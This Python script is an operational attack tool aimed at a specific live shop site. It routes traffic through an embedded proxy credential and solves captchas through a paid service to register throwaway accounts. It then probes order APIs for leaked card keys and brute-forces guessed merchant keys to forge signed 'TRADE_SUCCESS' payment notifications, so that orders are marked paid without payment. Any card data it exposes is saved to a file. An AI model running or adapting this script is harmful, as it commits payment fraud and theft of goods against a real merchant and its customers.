#!/usr/bin/env python3
"""xinhe001 logged-in surface deep: user JS, payment pages, epay pid from site, order APIs."""
from __future__ import annotations

import hashlib
import json
import os
import random
import re
import string
import subprocess
import time
from datetime import datetime
from pathlib import Path

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://xinhe001.lol/shop/"
PROXY = os.environ.get(
    "QG_TUNNEL",
    "http://15E27ADA-A-JP-T-300-S-xhdeep:661C21F2CC15@overseas-us.tunnel.qg.net:16538",
)
TWOCAPTCHA_KEY = os.environ.get("TWOCAPTCHA_KEY", "").strip()
OUT = Path(
    os.environ.get(
        "XINHE_OUT",
        f"/workspace/results_xinhe001/order_deep_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
    )
)
OUT.mkdir(parents=True, exist_ok=True)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
CSRF = re.compile(r'csrf_token\s*=\s*"([^"]+)"')
HASHSALT = re.compile(r"var hashsalt=(.+?);")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)
PID_RE = re.compile(r"pid['\"]?\s*[:=]\s*['\"]?(\d+)", re.I)
KEY_RE = re.compile(r"(?:key|secret)['\"]?\s*[:=]\s*['\"]([a-fA-F0-9]{16,32})['\"]", re.I)


def log(msg: str) -> None:
    print(msg, flush=True)
    with (OUT / "progress.log").open("a", encoding="utf-8") as f:
        f.write(msg + "\n")


def epay_sign(params: dict, key: str) -> str:
    items = sorted(k for k in params if k != "sign" and params[k] != "")
    return hashlib.md5(("&".join(f"{k}={params[k]}" for k in items) + key).encode()).hexdigest()


def leak(text: str) -> bool:
    return bool(
        SHOW.search(text)
        or "kminfo" in text
        or CARD.search(text)
        or ("----" in text and ("COM" in text or "sms" in text.lower()))
    )


def session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.proxies = {"http": PROXY, "https": PROXY}
    s.headers.update({"User-Agent": UA, "Accept-Language": "zh-CN"})
    return s


def compute_hashsalt(expr: str) -> str:
    expr = expr.strip()
    if not expr:
        return ""
    p = subprocess.run(
        ["node", "-e", f"console.log({expr})"],
        capture_output=True,
        text=True,
        timeout=12,
    )
    return p.stdout.strip() if p.returncode == 0 else ""


def solve_2captcha(gt: str, challenge: str, pageurl: str) -> dict | None:
    if not TWOCAPTCHA_KEY:
        return None
    cr = requests.post(
        "https://api.2captcha.com/createTask",
        json={
            "clientKey": TWOCAPTCHA_KEY,
            "task": {
                "type": "GeeTestTaskProxyless",
                "websiteURL": pageurl,
                "gt": gt,
                "challenge": challenge,
            },
        },
        timeout=30,
    ).json()
    if cr.get("errorId"):
        log(f"2cap create {cr}")
        return None
    tid = cr.get("taskId")
    log(f"2cap task {tid}")
    for i in range(40):
        time.sleep(5)
        res = requests.post(
            "https://api.2captcha.com/getTaskResult",
            json={"clientKey": TWOCAPTCHA_KEY, "taskId": tid},
            timeout=30,
        ).json()
        if res.get("status") == "ready":
            sol = res["solution"]
            return {
                "geetest_challenge": sol.get("challenge"),
                "geetest_validate": sol.get("validate"),
                "geetest_seccode": sol.get("seccode"),
            }
        if res.get("errorId"):
            return None
    return None


def register(s: requests.Session) -> tuple[str, str, bool]:
    user = "xh" + "".join(random.choices(string.ascii_lowercase + string.digits, k=9))
    pwd = "Xh" + "".join(random.choices(string.digits, k=8)) + "a1"
    qq = str(random.randint(100000000, 9999999999))
    s.headers["Referer"] = BASE
    s.get(BASE, timeout=30)
    reg_page = s.get(BASE + "user/reg.php", timeout=30)
    csrf = CSRF.search(reg_page.text).group(1) if CSRF.search(reg_page.text) else ""
    hs = compute_hashsalt(
        HASHSALT.search(reg_page.text).group(1) if HASHSALT.search(reg_page.text) else ""
    )
    cap = None
    for _ in range(5):
        r = s.get(BASE + "ajax.php", params={"act": "captcha", "t": str(time.time())}, timeout=20)
        try:
            j = r.json()
            if j.get("success") == 1 and j.get("challenge"):
                cap = j
                break
        except Exception:
            pass
        time.sleep(2)
    if not cap:
        return user, pwd, False
    solved = solve_2captcha(cap["gt"], cap["challenge"], BASE + "user/reg.php")
    if not solved:
        return user, pwd, False
    data = {
        "user": user,
        "pwd": pwd,
        "qq": qq,
        "hashsalt": hs,
        "csrf_token": csrf,
        **solved,
    }
    rr = s.post(BASE + "user/ajax.php?act=reguser", data=data, timeout=25)
    log(f"reg {rr.text[:200]}")
    try:
        return user, pwd, rr.json().get("code") == 1
    except Exception:
        return user, pwd, False


def extract_payment_meta(html: str) -> dict:
    meta = {}
    for pat, name in [
        (r"pid['\"]?\s*[:=]\s*['\"]?(\d+)", "pid"),
        (r"out_trade_no['\"]?\s*[:=]\s*['\"]([^'\"]+)", "out_trade_no"),
        (r"trade_no['\"]?\s*[:=]\s*['\"]([^'\"]+)", "trade_no"),
        (r"money['\"]?\s*[:=]\s*['\"]([\d.]+)", "money"),
        (r"name['\"]?\s*[:=]\s*['\"]([^'\"]{1,80})", "name"),
        (r"notify_url['\"]?\s*[:=]\s*['\"]([^'\"]+)", "notify_url"),
        (r"return_url['\"]?\s*[:=]\s*['\"]([^'\"]+)", "return_url"),
        (r"sign['\"]?\s*[:=]\s*['\"]([a-f0-9]{32})", "sign_sample"),
        (r"key['\"]?\s*[:=]\s*['\"]([a-fA-F0-9]{8,64})", "key_hint"),
    ]:
        m = re.search(pat, html, re.I)
        if m:
            meta[name] = m.group(1)
    return meta


def notify_with_keys(s: requests.Session, trade: str, money: str, pids: list[str], keys: list[str]) -> list:
    hits = []
    types = ["qqpay", "alipay", "wxpay", "epay"]
    for pid in pids:
        for key in keys:
            for typ in types:
                for m in [money, "0.01", "1.00", "5.00"]:
                    params = {
                        "pid": pid,
                        "type": typ,
                        "out_trade_no": trade,
                        "notify_url": BASE + "other/epay_notify.php",
                        "return_url": BASE + "other/return.php",
                        "name": "test",
                        "money": m,
                        "trade_no": trade,
                        "trade_status": "TRADE_SUCCESS",
                    }
                    params["sign"] = epay_sign(params, key)
                    params["sign_type"] = "MD5"
                    try:
                        rr = s.post(BASE + "other/epay_notify.php", data=params, timeout=12)
                        b = rr.text.strip()
                        if b and b not in ("error", "fail", "FAIL", "") and "No Act" not in b:
                            hits.append({"pid": pid, "key": key, "type": typ, "money": m, "body": b[:300]})
                            log(f"NOTIFY HIT pid={pid} key={key} {b[:80]}")
                    except Exception:
                        pass
    return hits


def scan_user_js(s: requests.Session) -> list:
    acts = []
    for path in [
        "assets/user/js/app.js",
        "assets/faka/js/query.js",
        "assets/faka/js/buy.js",
        "assets/faka/js/order.js",
    ]:
        try:
            r = s.get(BASE + path, timeout=20)
            if r.status_code == 200:
                (OUT / path.replace("/", "_")).write_text(r.text[:200000], encoding="utf-8")
                for m in re.finditer(r"act[=]([a-zA-Z0-9_]+)", r.text):
                    acts.append((path, m.group(1)))
                for m in re.finditer(r"['\"]act['\"]\s*:\s*['\"]([a-zA-Z0-9_]+)", r.text):
                    acts.append((path, m.group(1)))
        except Exception:
            pass
    return acts


def probe_ajax_acts(s: requests.Session, csrf: str) -> list:
    found = []
    acts = [
        "orderlist", "orders", "myorder", "order", "query", "kminfo", "faka",
        "getorder", "orderinfo", "card", "km", "toollog", "gift", "cart",
    ]
    for act in acts:
        try:
            g = s.get(BASE + "ajax.php", params={"act": act}, timeout=12)
            t = g.text[:400]
            if t and "No Act" not in t and '"code":403' not in t:
                found.append({"act": act, "get": t})
                if leak(g.text):
                    log(f"LEAK act={act} GET")
            p = s.post(
                BASE + "ajax.php?act=" + act,
                data={"csrf_token": csrf},
                timeout=12,
            )
            tp = p.text[:400]
            if tp and "No Act" not in tp and '"code":403' not in tp:
                found.append({"act": act, "post": tp})
                if leak(p.text):
                    log(f"LEAK act={act} POST")
        except Exception:
            pass
        time.sleep(0.3)
    return found


def main() -> None:
    report: dict = {
        "target": "xinhe001.lol",
        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "CARD_LEAK": False,
        "cards": [],
    }
    s = session()
    s.get(BASE, timeout=30)
    s.headers["Referer"] = BASE
    gc = s.get(BASE + "ajax.php?act=getcount", timeout=20).json()
    report["getcount"] = gc
    site_pid = str(gc.get("site", "435"))
    log(f"site pid candidate {site_pid} orders={gc.get('orders')}")

    js_acts = scan_user_js(s)
    report["js_acts"] = js_acts[:80]

    user, pwd, ok = register(s)
    report["user"] = user
    report["pwd"] = pwd
    report["reg_ok"] = ok
    if not ok:
        if not TWOCAPTCHA_KEY:
            log("no TWOCAPTCHA_KEY — probing guest vectors only")
        else:
            log("reg failed")
        # guest probes
        for data in ["1", "138", "888", "2026", "20260802"]:
            q = s.get(BASE, params={"mod": "query", "data": data}, timeout=15)
            so = SHOW.findall(q.text)
            if so:
                report["guest_query"] = {"data": data, "shows": so[:5]}
                report["CARD_LEAK"] = True
        (OUT / "report.json").write_text(json.dumps(report, ensure_ascii=False, indent=2))
        return

    # user panel pages
    pages = {}
    for path in [
        "user/",
        "user/index.php",
        "user/orders.php",
        "user/order.php",
        "user/record.php",
        "user/kami.php",
        "user/card.php",
    ]:
        try:
            r = s.get(BASE + path, timeout=20)
            pages[path] = {"len": len(r.text), "leak": leak(r.text)}
            if leak(r.text):
                (OUT / f"page_{path.replace('/', '_')}.html").write_text(r.text[:100000], encoding="utf-8")
                report["CARD_LEAK"] = True
        except Exception:
            pass
    report["user_pages"] = pages

    buy = s.get(BASE, params={"mod": "buy", "cid": "4", "tid": "34"}, timeout=25)
    csrf = CSRF.search(buy.text).group(1) if CSRF.search(buy.text) else ""
    hs = compute_hashsalt(
        HASHSALT.search(buy.text).group(1) if HASHSALT.search(buy.text) else ""
    )
    ajax_found = probe_ajax_acts(s, csrf)
    report["ajax_probe"] = ajax_found

    pay = s.post(
        BASE + "ajax.php?act=pay",
        data={
            "tid": "34",
            "inputvalue": "123456789",
            "num": "1",
            "hashsalt": hs,
            "csrf_token": csrf,
        },
        timeout=25,
    )
    report["pay"] = pay.text[:500]
    log(f"pay {pay.text[:150]}")
    trade = None
    money = "5.00"
    try:
        pj = pay.json()
        trade = pj.get("trade_no")
        money = str(pj.get("money", money))
        report["pay_json"] = pj
    except Exception:
        pass

    if not trade:
        (OUT / "report.json").write_text(json.dumps(report, ensure_ascii=False, indent=2))
        return

    # payment chain
    pay_pages = {}
    for typ in ["qqpay", "alipay", "wxpay", "epay"]:
        sub = s.get(BASE + "other/submit.php", params={"type": typ, "orderid": trade}, timeout=20)
        pay_pages[f"submit_{typ}"] = {"len": len(sub.text), "snip": sub.text[:500]}
        (OUT / f"submit_{typ}.html").write_text(sub.text[:80000], encoding="utf-8")
        meta = extract_payment_meta(sub.text)
        if meta:
            pay_pages[f"submit_{typ}"]["meta"] = meta
        # follow redirect target
        m = re.search(r"(?:location|href)\s*=\s*['\"]([^'\"]+qqpay[^'\"]+)", sub.text, re.I)
        if m:
            url = m.group(1)
            if not url.startswith("http"):
                url = BASE + url.lstrip("/")
            qq = s.get(url, timeout=20)
            (OUT / f"qqpay_{typ}.html").write_text(qq.text[:80000], encoding="utf-8")
            pay_pages[f"qqpay_{typ}"] = {"len": len(qq.text), "meta": extract_payment_meta(qq.text)}
    report["payment_pages"] = pay_pages

    qq_direct = s.get(BASE + "other/qqpay.php", params={"trade_no": trade}, timeout=20)
    (OUT / "qqpay_direct.html").write_text(qq_direct.text[:80000], encoding="utf-8")
    report["qqpay_direct"] = {"len": len(qq_direct.text), "meta": extract_payment_meta(qq_direct.text), "snip": qq_direct.text[:400]}

    # payrmb + userinfo
    prmb = s.post(
        BASE + "ajax.php?act=payrmb",
        data={"trade_no": trade, "csrf_token": csrf},
        timeout=15,
    )
    report["payrmb"] = prmb.text[:300]
    ui = s.get(BASE + "ajax.php?act=userinfo", timeout=15)
    report["userinfo"] = ui.text[:300]

    keys = [
        "123456", "888888", "xinhe", "xinghe001", "xinhe001", "faka", "rainbow",
        "epay", "mapi", "admin", "12345678", site_pid, "432", "435",
    ]
    # rainbow defaults + site id as key
    keys.extend([site_pid, hashlib.md5(site_pid.encode()).hexdigest()[:16]])
    pids = ["1000", "1001", site_pid, "432", "435", "1"]
    nh = notify_with_keys(s, trade, money, pids, keys)
    report["notify_hits"] = nh

    # order + getshop + faka if skey
    orr = s.get(BASE, params={"mod": "order", "orderid": trade}, timeout=20)
    (OUT / "order.html").write_text(orr.text[:100000], encoding="utf-8")
    so = SHOW.findall(orr.text)
    report["order_show"] = so[:5]
    if leak(orr.text):
        report["CARD_LEAK"] = True
        m = CARD.search(orr.text)
        if m:
            report["cards"].append(m.group(1).strip())

    gs = s.get(BASE + "other/getshop.php", params={"trade_no": trade}, timeout=15)
    report["getshop"] = gs.text[:400]
    if leak(gs.text):
        report["CARD_LEAK"] = True

    for oid, sk in so[:3]:
        fk = s.get(BASE, params={"mod": "faka", "id": oid, "skey": sk}, timeout=15)
        if leak(fk.text):
            (OUT / f"faka_{oid}.html").write_text(fk.text[:50000], encoding="utf-8")
            report["CARD_LEAK"] = True
            cm = CARD.search(fk.text)
            if cm:
                report["cards"].append(cm.group(1).strip())

    # re-check notify then order
    time.sleep(2)
    orr2 = s.get(BASE, params={"mod": "order", "orderid": trade}, timeout=20)
    if leak(orr2.text) and not report["CARD_LEAK"]:
        report["CARD_LEAK"] = True

    if report["cards"]:
        (OUT / "cards.txt").write_text("\n".join(report["cards"]), encoding="utf-8")

    (OUT / "report.json").write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    log(f"DONE CARD_LEAK={report['CARD_LEAK']} trade={trade} OUT={OUT}")


if __name__ == "__main__":
    main()
